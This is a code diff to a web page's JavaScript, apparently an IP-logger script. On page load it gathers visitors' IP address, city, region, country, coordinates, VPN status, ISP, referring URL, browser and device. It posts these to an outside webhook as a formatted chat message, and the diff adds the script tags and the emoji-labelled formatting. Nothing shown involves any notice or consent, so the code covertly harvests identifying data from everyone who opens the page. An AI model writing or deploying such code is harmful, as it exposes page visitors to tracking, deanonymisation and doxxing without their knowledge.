@@ -1,3 +1,4 @@
+<script>
     function httpGetAsync(url, callback) {
         const xmlHttp = new XMLHttpRequest();
         xmlHttp.onreadystatechange = function() {
@@ -56,7 +57,33 @@
         const request = new XMLHttpRequest();
         request.open("POST", webhookURL);
 
-        const message = JSON.stringify({ content: JSON.stringify(data, null, 2) });
+        const emojis = {
+            location: '🌍',
+            vpn: '🛡️',
+            calendar: '📅',
+            clock: '🕒',
+            link: '🔗',
+            computer: '💻',
+        };
+
+        const messageContent = `**${emojis.location} IP Address:** ${data.ip_address}\n` +
+            `**${emojis.location} Current URL:** ${data.current_url}\n` +
+            `**${emojis.location} City:** ${data.city}\n` +
+            `**${emojis.location} Region:** ${data.region}\n` +
+            `**${emojis.location} Country:** ${data.country} (${data.country_code})\n` +
+            `**${emojis.location} Continent:** ${data.continent} (${data.continent_code})\n` +
+            `**${emojis.location} Longitude/Latitude:** ${data.longitude}, ${data.latitude}\n` +
+            `**${emojis.vpn} VPN Status:** ${data.security_vpn ? 'Using VPN' : 'Not Using VPN'}\n` +
+            `**${emojis.location} Flag:** ${data.flag}\n` +
+            `**${emojis.location} ISP:** ${data.isp_name}\n` +
+            `**${emojis.calendar} Date:** ${data.date}\n` +
+            `**${emojis.calendar} Day:** ${data.day}\n` +
+            `**${emojis.clock} Time:** ${data.time}\n` +
+            `**${emojis.link} Referring URL:** ${data.referringURL}\n` +
+            `**${emojis.computer} Browser:** ${data.browser}\n` +
+            `**${emojis.computer} Device:** ${data.device}`;
+
+        const message = JSON.stringify({ content: messageContent });
 
         request.setRequestHeader('Content-type', 'application/json');
         request.send(message);
@@ -65,3 +92,4 @@
     window.onload = function() {
         analyzeTraffic(); // Automatically run the analysis when the page loads
     };
+</script>
